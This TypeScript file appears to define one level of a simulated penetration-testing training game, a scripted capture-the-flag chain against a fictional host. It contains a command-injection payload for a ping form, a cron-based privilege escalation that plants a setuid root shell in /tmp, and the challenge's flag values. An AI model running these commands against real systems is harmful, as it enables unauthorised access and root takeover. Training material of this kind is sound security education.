import type { ChainDef } from "../../types";
import { cmd, normalize } from "../../engine";

const IP = "192.0.2.130";

export const hardLevel3: ChainDef = {
  id: "hard-3",
  difficulty: "hard",
  order: 3,
  points: 150,
  title: "Target PG02",
  codename: "STANDALONE ASSESSMENT — PG02",
  summary: "A form field that shells out to a system utility on your behalf. See where that goes.",
  briefing: [
    `TARGET: PG02 — ${IP}`,
    "OBJECTIVE: gain a foothold, escalate to root, recover local.txt and proof.txt.",
    "",
    "No further intel provided.",
  ],
  debrief: [
    "root cause: an internal network-diagnostics tool passed unsanitized input straight to a shell",
    "command (OS command injection, CWE-78), chained into a world-writable script executed by",
    "root's crontab every minute.",
    "",
    "PG02: proof.txt recovered.",
  ],
  nodes: [
    {
      id: "pg02",
      org: "Target PG02",
      city: "Unknown",
      state: "N/A",
      coords: { x: 65, y: 42 },
      ip: IP,
      tagline: "Standalone assessment target",
      briefing: [`IP: ${IP}`, "No further information provided."],
      initialPrompt: "op@breachline:~$",
      motd: [],
      objectives: [
        { id: "recon", label: "Enumerate open services on the target", tactic: "Reconnaissance" },
        { id: "foothold", label: "Get code execution on the target", tactic: "Initial Access", requires: ["recon"] },
        { id: "user", label: "Recover local.txt", tactic: "Collection", requires: ["foothold"] },
        { id: "privesc", label: "Escalate to root", tactic: "Privilege Escalation", requires: ["user"] },
        { id: "root", label: "Recover proof.txt", tactic: "Collection", requires: ["privesc"] },
      ],
      hints: [
        "Not every vulnerable field is obvious from the outside — a form that shells out to a system utility on your behalf is worth testing for exactly that.",
        "Root doesn't always mean a vulnerable binary — sometimes it means something scheduled to run as root that anyone happens to be able to edit.",
      ],
      debrief: [],
      commands: [
        cmd({
          id: "nmap",
          tool: "nmap",
          requires: [IP],
          help: "nmap -sV <ip>",
          run: () => ({
            completesObjective: "recon",
            tone: "success",
            setsFlags: ["scanned"],
            output: [
              "PORT   STATE SERVICE VERSION",
              "80/tcp open  http    nginx 1.24.0",
              "",
              "Nmap done: 1 IP address (1 host up) scanned in 3.88 seconds",
            ],
          }),
        }),
        cmd({
          id: "curl-root",
          tool: "curl",
          requires: [IP],
          forbids: ["ping.php"],
          help: "curl http://<ip>",
          requiresObjectives: ["recon"],
          run: () => ({
            tone: "output",
            output: [
              "HTTP/1.1 200 OK",
              "",
              "<title>NetDiag Utility Panel</title>",
              '<form action="/ping.php" method="GET">',
              '  <input name="host" placeholder="host to ping">',
              "</form>",
            ],
          }),
        }),
        cmd({
          id: "inject-id",
          tool: "curl",
          requires: ["ping.php", ";id"],
          help: 'curl "http://<ip>/ping.php?host=127.0.0.1;id"',
          requiresObjectives: ["recon"],
          run: () => ({
            completesObjective: "foothold",
            tone: "success",
            setsFlags: ["have_shell"],
            output: [
              "HTTP/1.1 200 OK",
              "PING 127.0.0.1 (127.0.0.1): 56 data bytes",
              "64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.04 ms",
              "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
              "",
              "[+] host= is passed straight to a shell command — no sanitization at all.",
            ],
          }),
        }),
        cmd({
          id: "cat-local",
          tool: "cat",
          requires: ["local.txt"],
          help: "cat /var/www/local.txt",
          requiresFlags: ["have_shell"],
          run: () => ({
            completesObjective: "user",
            tone: "success",
            note: "PG02 — local.txt: c4ca4238a0b923820dcc509a6f75849b",
            output: ["c4ca4238a0b923820dcc509a6f75849b"],
          }),
        }),
        cmd({
          id: "cat-crontab",
          tool: "cat",
          requires: ["crontab"],
          help: "cat /etc/crontab",
          requiresFlags: ["have_shell"],
          run: () => ({
            tone: "warn",
            setsFlags: ["saw_cron"],
            output: [
              "* * * * * root /opt/netdiag/cleanup.sh",
              "",
              "note: cleanup.sh permissions are -rwxrwxrwx — world-writable, run as root every minute.",
            ],
          }),
        }),
        {
          id: "cron-privesc",
          match: (input) => {
            const n = normalize(input);
            return n.includes("cleanup.sh") && n.includes("rootbash");
          },
          help: "echo 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' >> /opt/netdiag/cleanup.sh",
          requiresFlags: ["saw_cron"],
          deniedOutput: ["you need to know the cron job exists — and that it's writable — before you can abuse it."],
          run: () => ({
            completesObjective: "privesc",
            tone: "success",
            setsFlags: ["root_access"],
            output: [
              "[+] appended payload to /opt/netdiag/cleanup.sh",
              "[cron] root's crontab ran cleanup.sh within the next 60 seconds ...",
              "[+] /tmp/rootbash created, setuid root",
              "",
              "[+] root access confirmed via /tmp/rootbash -p",
            ],
          }),
        },
        cmd({
          id: "cat-proof",
          tool: "cat",
          requires: ["proof.txt"],
          help: "cat /root/proof.txt",
          requiresFlags: ["root_access"],
          run: () => ({
            completesObjective: "root",
            tone: "success",
            note: "PG02 — proof.txt: 098f6bcd4621d373cade4e832627b4f6",
            output: ["098f6bcd4621d373cade4e832627b4f6", "", "PG02: ROOT"],
          }),
        }),
      ],
    },
  ],
};
